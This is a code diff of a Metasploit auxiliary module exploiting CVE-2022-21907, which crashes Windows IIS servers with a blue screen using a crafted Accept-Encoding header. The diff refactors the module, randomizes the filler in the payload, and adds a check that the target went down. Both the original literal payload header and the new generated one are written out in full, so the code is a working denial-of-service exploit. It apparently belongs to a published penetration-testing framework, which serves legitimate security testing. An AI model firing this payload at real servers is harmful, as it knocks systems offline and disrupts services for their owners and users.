@@ -14,19 +14,20 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Dos
 
-  ##
-  # Initialize informations about module.
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name' => 'CVE-2022-21907: HTTP Protocol Stack Remote Code Execution Vulnerability - Windows IIS DOS BlueScreen',
-        'Description' => 'This module can be used to perform a DOS attack on IIS server. This module exploit the CVE-2022-21907 and causes a Blue Screen with only one payload.',
+        'Name' => 'CVE-2022-21907: HTTP Protocol Stack Remote Code Execution' +
+          ' Vulnerability - Windows IIS DOS BlueScreen',
+        'Description' => 'This module can be used to perform a DOS attack on' +
+          ' IIS server. This module exploit CVE-2022-21907 and causes a Blue' +
+          ' Screen with only one payload.',
         'License' => MSF_LICENSE,
         'Author' => ['Maurice LAMBERT <mauricelambert434@gmail.com>'],
         'Platform' => 'win',
         'References' => [
-          %w[CVE 2022-21907],
+          ['CVE', '2022-21907'],
           ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-21907'],
           ['URL', 'https://github.com/mauricelambert/CVE-2022-21907']
         ],
@@ -34,9 +35,17 @@ class MetasploitModule < Msf::Auxiliary
         'Notes' => {
           'Stability' => [CRASH_OS_RESTARTS],
           'Reliability' => [IOC_IN_LOGS],
-          'SideEffects' => []
-        }
+          'SideEffects' => [SCREEN_EFFECTS]
+        },
       )
+    )
+
+    register_options(
+      [
+        OptString.new(
+          'TARGETURI', [true, 'The URI of the IIS Server.', '/'],
+        )
+      ]
     )
   end
 
@@ -45,8 +54,8 @@ class MetasploitModule < Msf::Auxiliary
   def run
     vprint_status('Trying first connection...')
 
-    res = send_request_raw(
-      'uri' => '/',
+    res = send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, ''),
       'method' => 'GET'
     )
 
@@ -60,24 +69,35 @@ class MetasploitModule < Msf::Auxiliary
     vprint_good('First connection OK. Sending payload...')
 
     payload = {
-      'Accept-Encoding' => 'AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************AAAAAA, *, ,'
+      'Accept-Encoding' => Rex::Text.rand_text_alphanumeric(24) +
+      ",&#{Rex::Text.rand_text_alphanumeric(2)}&**" + 
+      "#{Rex::Text.rand_text_alphanumeric(20)}**" + 
+      "#{Rex::Text.rand_text_alphanumeric(1)}," +
+      "#{Rex::Text.rand_text_alphanumeric(73)}," +
+      "#{Rex::Text.rand_text_alphanumeric(71)}," +
+      "#{Rex::Text.rand_text_alphanumeric(27)},***************" +
+      "*************#{Rex::Text.rand_text_alphanumeric(6)}, *, ,"
     }
-    timeout = datastore['HttpClientTimeout']
-    datastore['HttpClientTimeout'] = 10
 
-    res = send_request_raw({
-                             'uri' => '/',
-                             'timeout' => 10,
+    res = send_request_cgi({
+                             'uri' => normalize_uri(target_uri.path, ''),
+                             'timeout' => 1,
+                             # short timeout -> the server should not respond
                              'method' => 'GET',
                              'headers' => payload
                            })
 
+    vprint_good('Payload is sent. Check that the server is down...')
+
+    res = send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, ''),
+      'method' => 'GET'
+    )
+
     if res.nil?
-      print_good('Target is down ! Congratulations !')
+      print_good('Target is down.')
     else
       print_error('Target is not vulnerable and up.')
     end
-
-    datastore['HttpClientTimeout'] = timeout
   end
 end
